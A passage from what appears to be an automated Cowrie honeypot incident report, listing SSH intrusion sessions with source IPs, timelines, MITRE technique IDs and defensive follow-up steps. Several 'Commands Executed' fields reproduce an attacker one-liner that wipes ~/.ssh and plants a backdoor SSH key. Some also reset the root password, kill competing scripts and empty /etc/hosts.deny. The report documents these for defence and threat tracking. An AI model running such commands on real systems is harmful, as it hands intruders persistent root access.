| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:K4YhddRwa9KA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:33:31` | `cowrie.session.connect` |
| `2026-06-09 11:33:31` | `cowrie.client.version` |
| `2026-06-09 11:33:32` | `cowrie.client.kex` |
| `2026-06-09 11:33:33` | `cowrie.login.success` |
| `2026-06-09 11:33:34` | `cowrie.session.params` |
| `2026-06-09 11:33:34` | `cowrie.command.input` |
| `2026-06-09 11:33:34` | `cowrie.command.failed` |
| `2026-06-09 11:33:34` | `cowrie.log.closed` |
| `2026-06-09 11:33:35` | `cowrie.session.params` |
| `2026-06-09 11:33:35` | `cowrie.command.input` |
| `2026-06-09 11:33:35` | `cowrie.session.file_download` |
| `2026-06-09 11:33:35` | `cowrie.log.closed` |
| `2026-06-09 11:33:48` | `cowrie.session.params` |
| `2026-06-09 11:33:48` | `cowrie.command.input` |
| `2026-06-09 11:33:48` | `cowrie.log.closed` |
| `2026-06-09 11:33:48` | `cowrie.session.params` |
| `2026-06-09 11:33:48` | `cowrie.command.input` |
| `2026-06-09 11:33:49` | `cowrie.log.closed` |
| `2026-06-09 11:33:50` | `cowrie.session.params` |
| `2026-06-09 11:33:50` | `cowrie.command.input` |
| `2026-06-09 11:33:50` | `cowrie.session.file_download` |
| `2026-06-09 11:33:50` | `cowrie.log.closed` |
| `2026-06-09 11:33:50` | `cowrie.session.params` |
| `2026-06-09 11:33:50` | `cowrie.command.input` |
| `2026-06-09 11:33:51` | `cowrie.log.closed` |
| `2026-06-09 11:33:52` | `cowrie.session.params` |
| `2026-06-09 11:33:52` | `cowrie.command.input` |
| `2026-06-09 11:33:52` | `cowrie.log.closed` |
| `2026-06-09 11:33:53` | `cowrie.session.params` |
| `2026-06-09 11:33:53` | `cowrie.command.input` |
| `2026-06-09 11:33:53` | `cowrie.command.input` |
| `2026-06-09 11:33:53` | `cowrie.log.closed` |
| `2026-06-09 11:33:54` | `cowrie.session.params` |
| `2026-06-09 11:33:54` | `cowrie.command.input` |
| `2026-06-09 11:33:54` | `cowrie.log.closed` |
| `2026-06-09 11:33:55` | `cowrie.session.params` |
| `2026-06-09 11:33:55` | `cowrie.command.input` |
| `2026-06-09 11:33:55` | `cowrie.log.closed` |
| `2026-06-09 11:33:56` | `cowrie.session.params` |
| `2026-06-09 11:33:56` | `cowrie.command.input` |
| `2026-06-09 11:33:56` | `cowrie.log.closed` |
| `2026-06-09 11:33:57` | `cowrie.session.params` |
| `2026-06-09 11:33:57` | `cowrie.command.input` |
| `2026-06-09 11:33:57` | `cowrie.log.closed` |
| `2026-06-09 11:33:58` | `cowrie.session.params` |
| `2026-06-09 11:33:58` | `cowrie.command.input` |
| `2026-06-09 11:33:58` | `cowrie.log.closed` |
| `2026-06-09 11:33:59` | `cowrie.session.params` |
| `2026-06-09 11:33:59` | `cowrie.command.input` |
| `2026-06-09 11:34:00` | `cowrie.log.closed` |
| `2026-06-09 11:34:01` | `cowrie.session.params` |
| `2026-06-09 11:34:01` | `cowrie.command.input` |
| `2026-06-09 11:34:01` | `cowrie.log.closed` |
| `2026-06-09 11:34:01` | `cowrie.session.params` |
| `2026-06-09 11:34:01` | `cowrie.command.input` |
| `2026-06-09 11:34:02` | `cowrie.log.closed` |
| `2026-06-09 11:34:02` | `cowrie.session.params` |
| `2026-06-09 11:34:02` | `cowrie.command.input` |
| `2026-06-09 11:34:03` | `cowrie.log.closed` |
| `2026-06-09 11:34:03` | `cowrie.session.params` |
| `2026-06-09 11:34:03` | `cowrie.command.input` |
| `2026-06-09 11:34:04` | `cowrie.log.closed` |
| `2026-06-09 11:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0578a2d14b14

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-09 11:34 |
| **Last Seen** | 2026-06-09 11:35 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:XNBMLDPU22oW"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:34:31` | `cowrie.session.connect` |
| `2026-06-09 11:34:33` | `cowrie.client.version` |
| `2026-06-09 11:34:34` | `cowrie.client.kex` |
| `2026-06-09 11:34:35` | `cowrie.login.success` |
| `2026-06-09 11:34:37` | `cowrie.session.params` |
| `2026-06-09 11:34:37` | `cowrie.command.input` |
| `2026-06-09 11:34:37` | `cowrie.command.failed` |
| `2026-06-09 11:34:37` | `cowrie.log.closed` |
| `2026-06-09 11:34:38` | `cowrie.session.params` |
| `2026-06-09 11:34:38` | `cowrie.command.input` |
| `2026-06-09 11:34:38` | `cowrie.session.file_download` |
| `2026-06-09 11:34:38` | `cowrie.log.closed` |
| `2026-06-09 11:34:50` | `cowrie.session.params` |
| `2026-06-09 11:34:50` | `cowrie.command.input` |
| `2026-06-09 11:34:50` | `cowrie.log.closed` |
| `2026-06-09 11:34:51` | `cowrie.session.params` |
| `2026-06-09 11:34:51` | `cowrie.command.input` |
| `2026-06-09 11:34:51` | `cowrie.log.closed` |
| `2026-06-09 11:34:52` | `cowrie.session.params` |
| `2026-06-09 11:34:52` | `cowrie.command.input` |
| `2026-06-09 11:34:52` | `cowrie.session.file_download` |
| `2026-06-09 11:34:52` | `cowrie.log.closed` |
| `2026-06-09 11:34:53` | `cowrie.session.params` |
| `2026-06-09 11:34:53` | `cowrie.command.input` |
| `2026-06-09 11:34:53` | `cowrie.log.closed` |
| `2026-06-09 11:34:54` | `cowrie.session.params` |
| `2026-06-09 11:34:54` | `cowrie.command.input` |
| `2026-06-09 11:34:54` | `cowrie.log.closed` |
| `2026-06-09 11:34:55` | `cowrie.session.params` |
| `2026-06-09 11:34:55` | `cowrie.command.input` |
| `2026-06-09 11:34:55` | `cowrie.command.input` |
| `2026-06-09 11:34:55` | `cowrie.log.closed` |
| `2026-06-09 11:34:56` | `cowrie.session.params` |
| `2026-06-09 11:34:56` | `cowrie.command.input` |
| `2026-06-09 11:34:56` | `cowrie.log.closed` |
| `2026-06-09 11:34:56` | `cowrie.session.params` |
| `2026-06-09 11:34:56` | `cowrie.command.input` |
| `2026-06-09 11:34:57` | `cowrie.log.closed` |
| `2026-06-09 11:34:57` | `cowrie.session.params` |
| `2026-06-09 11:34:57` | `cowrie.command.input` |
| `2026-06-09 11:34:57` | `cowrie.log.closed` |
| `2026-06-09 11:34:58` | `cowrie.session.params` |
| `2026-06-09 11:34:58` | `cowrie.command.input` |
| `2026-06-09 11:34:59` | `cowrie.log.closed` |
| `2026-06-09 11:34:59` | `cowrie.session.params` |
| `2026-06-09 11:34:59` | `cowrie.command.input` |
| `2026-06-09 11:35:00` | `cowrie.log.closed` |
| `2026-06-09 11:35:00` | `cowrie.session.params` |
| `2026-06-09 11:35:00` | `cowrie.command.input` |
| `2026-06-09 11:35:00` | `cowrie.log.closed` |
| `2026-06-09 11:35:01` | `cowrie.session.params` |
| `2026-06-09 11:35:01` | `cowrie.command.input` |
| `2026-06-09 11:35:02` | `cowrie.log.closed` |
| `2026-06-09 11:35:02` | `cowrie.session.params` |
| `2026-06-09 11:35:02` | `cowrie.command.input` |
| `2026-06-09 11:35:02` | `cowrie.log.closed` |
| `2026-06-09 11:35:03` | `cowrie.session.params` |
| `2026-06-09 11:35:03` | `cowrie.command.input` |
| `2026-06-09 11:35:03` | `cowrie.log.closed` |
| `2026-06-09 11:35:04` | `cowrie.session.params` |
| `2026-06-09 11:35:04` | `cowrie.command.input` |
| `2026-06-09 11:35:04` | `cowrie.log.closed` |
| `2026-06-09 11:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf1b12be0983

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:35 |
| **Last Seen** | 2026-06-09 11:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:35:56` | `cowrie.session.connect` |
| `2026-06-09 11:35:56` | `cowrie.client.version` |
| `2026-06-09 11:35:56` | `cowrie.client.kex` |
| `2026-06-09 11:35:57` | `cowrie.login.success` |
| `2026-06-09 11:35:57` | `cowrie.session.params` |
| `2026-06-09 11:35:57` | `cowrie.command.input` |
| `2026-06-09 11:35:57` | `cowrie.command.failed` |
| `2026-06-09 11:35:57` | `cowrie.log.closed` |
| `2026-06-09 11:35:57` | `cowrie.session.params` |
| `2026-06-09 11:35:57` | `cowrie.command.input` |
| `2026-06-09 11:35:57` | `cowrie.session.file_download` |
| `2026-06-09 11:35:57` | `cowrie.log.closed` |
| `2026-06-09 11:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-221b5827e21c

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:35 |
| **Last Seen** | 2026-06-09 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:35:59` | `cowrie.session.connect` |
| `2026-06-09 11:35:59` | `cowrie.client.version` |
| `2026-06-09 11:35:59` | `cowrie.client.kex` |
| `2026-06-09 11:35:59` | `cowrie.login.success` |
| `2026-06-09 11:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-842203db8338

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-09 11:37 |
| **Last Seen** | 2026-06-09 11:37 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:37:29` | `cowrie.session.connect` |
| `2026-06-09 11:37:30` | `cowrie.client.version` |
| `2026-06-09 11:37:30` | `cowrie.client.kex` |
| `2026-06-09 11:37:31` | `cowrie.login.success` |
| `2026-06-09 11:37:31` | `cowrie.session.params` |
| `2026-06-09 11:37:31` | `cowrie.command.input` |
| `2026-06-09 11:37:31` | `cowrie.command.failed` |
| `2026-06-09 11:37:32` | `cowrie.log.closed` |
| `2026-06-09 11:37:33` | `cowrie.session.params` |
| `2026-06-09 11:37:33` | `cowrie.command.input` |
| `2026-06-09 11:37:34` | `cowrie.session.file_download` |
| `2026-06-09 11:37:34` | `cowrie.log.closed` |
| `2026-06-09 11:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8089d8f102bc

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-09 11:37 |
| **Last Seen** | 2026-06-09 11:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:37:39` | `cowrie.session.connect` |
| `2026-06-09 11:37:39` | `cowrie.client.version` |
| `2026-06-09 11:37:40` | `cowrie.client.kex` |
| `2026-06-09 11:37:41` | `cowrie.login.success` |
| `2026-06-09 11:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdd3616ce36e

| Field | Detail |
|---|---|
| **Source IP** | `13.94.39[.]162` |
| **First Seen** | 2026-06-09 11:38 |
| **Last Seen** | 2026-06-09 11:39 |
| **Session Duration** | 77s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:38:14` | `cowrie.session.connect` |
| `2026-06-09 11:38:14` | `cowrie.client.version` |
| `2026-06-09 11:38:17` | `cowrie.client.kex` |
| `2026-06-09 11:38:19` | `cowrie.login.success` |
| `2026-06-09 11:38:30` | `cowrie.session.params` |
| `2026-06-09 11:38:30` | `cowrie.command.input` |
| `2026-06-09 11:38:30` | `cowrie.command.failed` |
| `2026-06-09 11:38:34` | `cowrie.log.closed` |
| `2026-06-09 11:38:37` | `cowrie.session.params` |
| `2026-06-09 11:38:37` | `cowrie.command.input` |
| `2026-06-09 11:38:37` | `cowrie.session.file_download` |
| `2026-06-09 11:38:37` | `cowrie.log.closed` |
| `2026-06-09 11:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.94.39[.]162` to AbuseIPDB if not already reported
- [ ] Block `13.94.39[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0de2b963054

| Field | Detail |
|---|---|
| **Source IP** | `13.94.39[.]162` |
| **First Seen** | 2026-06-09 11:39 |
| **Last Seen** | 2026-06-09 11:39 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:39:12` | `cowrie.session.connect` |
| `2026-06-09 11:39:12` | `cowrie.client.version` |
| `2026-06-09 11:39:13` | `cowrie.client.kex` |
| `2026-06-09 11:39:23` | `cowrie.login.success` |
| `2026-06-09 11:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.94.39[.]162` to AbuseIPDB if not already reported
- [ ] Block `13.94.39[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42323d2d962e

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:41 |
| **Last Seen** | 2026-06-09 11:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:41:26` | `cowrie.session.connect` |
| `2026-06-09 11:41:26` | `cowrie.client.version` |
| `2026-06-09 11:41:26` | `cowrie.client.kex` |
| `2026-06-09 11:41:28` | `cowrie.login.success` |
| `2026-06-09 11:41:28` | `cowrie.session.params` |
| `2026-06-09 11:41:28` | `cowrie.command.input` |
| `2026-06-09 11:41:28` | `cowrie.command.failed` |
| `2026-06-09 11:41:29` | `cowrie.log.closed` |
| `2026-06-09 11:41:29` | `cowrie.session.params` |
| `2026-06-09 11:41:29` | `cowrie.command.input` |
| `2026-06-09 11:41:29` | `cowrie.session.file_download` |
| `2026-06-09 11:41:29` | `cowrie.log.closed` |
| `2026-06-09 11:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df802e95ea4

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:41 |
| **Last Seen** | 2026-06-09 11:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:41:32` | `cowrie.session.connect` |
| `2026-06-09 11:41:32` | `cowrie.client.version` |
| `2026-06-09 11:41:32` | `cowrie.client.kex` |
| `2026-06-09 11:41:32` | `cowrie.login.success` |
| `2026-06-09 11:41:32` | `cowrie.session.params` |
| `2026-06-09 11:41:32` | `cowrie.command.input` |
| `2026-06-09 11:41:32` | `cowrie.command.failed` |
| `2026-06-09 11:41:32` | `cowrie.log.closed` |
| `2026-06-09 11:41:32` | `cowrie.session.params` |
| `2026-06-09 11:41:32` | `cowrie.command.input` |
| `2026-06-09 11:41:33` | `cowrie.session.file_download` |
| `2026-06-09 11:41:33` | `cowrie.log.closed` |
| `2026-06-09 11:41:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f8e1a862b9

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:41 |
| **Last Seen** | 2026-06-09 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:41:33` | `cowrie.session.connect` |
| `2026-06-09 11:41:33` | `cowrie.client.version` |
| `2026-06-09 11:41:33` | `cowrie.client.kex` |
| `2026-06-09 11:41:34` | `cowrie.login.success` |
| `2026-06-09 11:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c290539c4b63

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 11:41 |
| **Last Seen** | 2026-06-09 11:42 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
